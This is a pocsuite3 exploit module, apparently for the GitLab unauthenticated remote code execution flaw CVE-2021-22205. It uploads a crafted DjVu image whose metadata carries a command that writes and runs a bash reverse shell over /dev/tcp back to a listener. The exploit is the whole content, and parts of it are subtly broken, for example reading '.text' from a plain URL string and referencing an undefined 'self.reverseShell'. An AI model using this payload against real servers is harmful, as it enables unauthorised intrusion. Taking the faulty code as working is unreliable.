from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,json,time
import requests
from bs4 import BeautifulSoup

class DemoPOC(POCBase):
    vulID = 'CVE_2021_22205'  # ssvid
    version = '1.0'
    name = 'gitlab未授权RCE'
    appName = 'gitlab未授权RCE'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''gitlab未授权RCE'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        session = requests.session()
        result = {}
        reverseShell = "echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"
        try:
            r1 = self.url + "/users/sign_in"
            target = self.url + "/uploads/user"
            soup = BeautifulSoup(r1.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + self.reverseShell + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                             \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            r = session.post(url=target, data=data, headers=headers, verify=False,
                                timeout=10)
            if flag in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                return self.parse_verify(result)

        except:
                pass
    def parse_verify(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)